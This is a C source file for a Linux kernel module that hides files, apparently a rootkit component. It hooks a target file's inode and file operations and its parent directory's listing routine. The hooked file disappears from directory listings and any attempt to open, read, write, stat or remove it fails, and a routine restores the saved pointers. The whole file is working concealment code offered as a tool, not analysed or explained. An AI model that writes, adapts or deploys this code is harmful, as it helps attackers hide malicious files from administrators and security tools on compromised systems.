#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/list.h>
#include <linux/slab.h>
#include "file.h"

struct dentry* parent_dentry;
struct path root_path;

unsigned long* inode_numbers;
int inode_count = 0;

/*** saved structure ***/
void** old_inode_pointer;
void** old_fop_pointer;
void** old_iop_pointer;
void** old_parent_inode_pointer;
void** old_parent_fop_pointer;
void** target_dentry;
filldir_t real_filldir;

/*** fake parent fop ***/
static int new_filldir(struct dir_context* ctx, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	unsigned int i = 0;
	unsigned int j = 0;
	struct dentry* pDentry;
		
	for(i = 0; i <= inode_count - 1; i ++) {
		pDentry = NULL;
			
		if(strcmp(name, ((struct dentry*)(target_dentry[i]))->d_name.name) == 0)
			pDentry = (struct dentry*)(target_dentry[i]);	
	
		if(pDentry != NULL) {
			for(j = 0; j <= inode_count - 1; j ++) {
				if(inode_numbers[j] == pDentry->d_inode->i_ino)
					return 0;
			}
		}
	}	
	
	return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

int parent_iterate(struct file* file, struct dir_context* ctx) {
	parent_dentry = file->f_path.dentry;
	real_filldir = ctx->actor;
	ctx->actor = new_filldir;
	return root_path.dentry->d_inode->i_fop->iterate_shared(file, ctx);
}

static struct file_operations new_parent_fop = {
	.owner = THIS_MODULE,
	.iterate_shared = parent_iterate,
};

/*** fake fop ***/
int new_mmap(struct file* file, struct vm_area_struct* area) {
	return -2;
}

ssize_t new_read(struct file* file, char __user* u, size_t t, loff_t *off) {
	return -2;
}

ssize_t new_write(struct file* file, const char __user* u, size_t t, loff_t* off) {
	return -2;
}

int new_release(struct inode* new_inode, struct file* file) {
	return -2;
}

int new_flush(struct file* file, fl_owner_t id) {
	return -2;
}

int new_iterate(struct file* file, struct dir_context* ctx) {
	return -2;
}

int new_open(struct inode* old_inode, struct file* old_file) {
	return -2;
}

static struct file_operations new_fop = {
	.owner = THIS_MODULE,
	.mmap = new_mmap,
	.read = new_read,
	.write = new_write,
	.release = new_release,
	.flush = new_flush,
	.iterate = new_iterate,	
	.open = new_open,
};

/*** fake iop ***/

int new_rmdir(struct inode* inode, struct dentry* dentry) {
	return -2;
}

int new_getattr(const struct path* path, struct kstat* kstat, u32 u, unsigned int i) {
	return -2;
}

static struct inode_operations new_iop = {
	.rmdir = new_rmdir,
	.getattr = new_getattr,
};

void allocate_memory(void) {
	old_inode_pointer = (void*)kmalloc(sizeof(void*), GFP_KERNEL);
	old_fop_pointer = (void*)kmalloc(sizeof(void*), GFP_KERNEL);
	old_iop_pointer = (void*)kmalloc(sizeof(void*), GFP_KERNEL);
	old_parent_inode_pointer = (void*)kmalloc(sizeof(void*), GFP_KERNEL);
	old_parent_fop_pointer = (void*)kmalloc(sizeof(void*), GFP_KERNEL);

	inode_numbers = (unsigned long*)kmalloc(sizeof(unsigned long), GFP_KERNEL);

	target_dentry = (void*)kmalloc(sizeof(void*), GFP_KERNEL);
}

void reallocate_memory(void) {
	inode_numbers = (unsigned long*)krealloc(inode_numbers, sizeof(unsigned long*) * (inode_count + 1), GFP_KERNEL);

	old_inode_pointer = (void*)krealloc(old_inode_pointer, sizeof(void*) * (inode_count + 1), GFP_KERNEL);
	old_fop_pointer = (void*)krealloc(old_fop_pointer, sizeof(void*) * (inode_count + 1), GFP_KERNEL);
	old_iop_pointer = (void*)krealloc(old_iop_pointer, sizeof(void*) * (inode_count + 1), GFP_KERNEL);

	old_parent_inode_pointer = (void*)krealloc(old_parent_inode_pointer, sizeof(void*) * (inode_count + 1), GFP_KERNEL);
	old_parent_fop_pointer = (void*)krealloc(old_parent_fop_pointer, sizeof(void*) * (inode_count + 1), GFP_KERNEL);

	target_dentry = (void*)krealloc(target_dentry, sizeof(void*) * (inode_count + 1), GFP_KERNEL);
}

void reduce_memory(int offset) {
	int i;
	for(i = offset; i < inode_count-1; i++) {
		inode_numbers[i] = inode_numbers[i+1];
		old_inode_pointer[i] = old_inode_pointer[i+1];
		old_fop_pointer[i] = old_fop_pointer[i+1];
		old_iop_pointer[i] = old_iop_pointer[i+1];
		old_parent_inode_pointer[i] = old_parent_inode_pointer[i+1];
		old_parent_fop_pointer[i] = old_parent_fop_pointer[i+1];
		target_dentry[i] = target_dentry[i+1];
	}
}


void free_memory(void) {
	kfree(old_inode_pointer);
	kfree(old_fop_pointer);
	kfree(old_iop_pointer);
	kfree(old_parent_inode_pointer);
	kfree(old_parent_fop_pointer);
	kfree(target_dentry);
	kfree(inode_numbers);
}

unsigned long hide_file(const char* filePath) {
	int error = 0;
	struct path pth;

	error = kern_path("/root", 0, &root_path);
	if(error) {
		printk(KERN_ALERT "Can't access root\n");
		return -1;
	}

	error = kern_path(filePath, 0, &pth);
	if(error) {
		printk(KERN_ALERT "Can't access file\n");
		return -1;
	}

	if (inode_count == 0) {
		allocate_memory();

		if (inode_numbers == NULL) {
			printk(KERN_ALERT "Not enough memory in buffer\n");
			return -1;
		}
	}
	

	/*** saving old structures ***/
	old_inode_pointer[inode_count] = pth.dentry->d_inode;
	old_fop_pointer[inode_count] = (void*)pth.dentry->d_inode->i_fop;
	old_iop_pointer[inode_count] = (void*)pth.dentry->d_inode->i_op;

	old_parent_inode_pointer[inode_count] = pth.dentry->d_parent->d_inode;
	old_parent_fop_pointer[inode_count] = (void*)pth.dentry->d_parent->d_inode->i_fop;

	inode_numbers[inode_count] = pth.dentry->d_inode->i_ino;
	target_dentry[inode_count] = pth.dentry;
	inode_count++;

	reallocate_memory();

	/*** hooking ***/
	pth.dentry->d_parent->d_inode->i_fop = &new_parent_fop;
	pth.dentry->d_inode->i_op = &new_iop;
	pth.dentry->d_inode->i_fop = &new_fop;

	return 0;
}	

unsigned long unhide_file_all(void) {
	int i;
	struct inode* Inode;
	struct inode* parentInode;

	for(i = 0; i < inode_count; i++) {
		Inode = old_inode_pointer[(inode_count - 1) - i];
		Inode->i_fop = (void*)old_fop_pointer[(inode_count - 1) - i];
		Inode->i_op = (void*)old_iop_pointer[(inode_count - 1) - i];
		
		parentInode = old_parent_inode_pointer[(inode_count - 1) - i];
		parentInode->i_fop = (void*)old_parent_fop_pointer[(inode_count - 1) - i];
	}

	kfree(old_inode_pointer);
	kfree(old_fop_pointer);
	kfree(old_iop_pointer);
	kfree(old_parent_inode_pointer);
	kfree(old_parent_fop_pointer);
	kfree(target_dentry);

	kfree(inode_numbers);
	inode_count = 0;
	

	return 0;
}
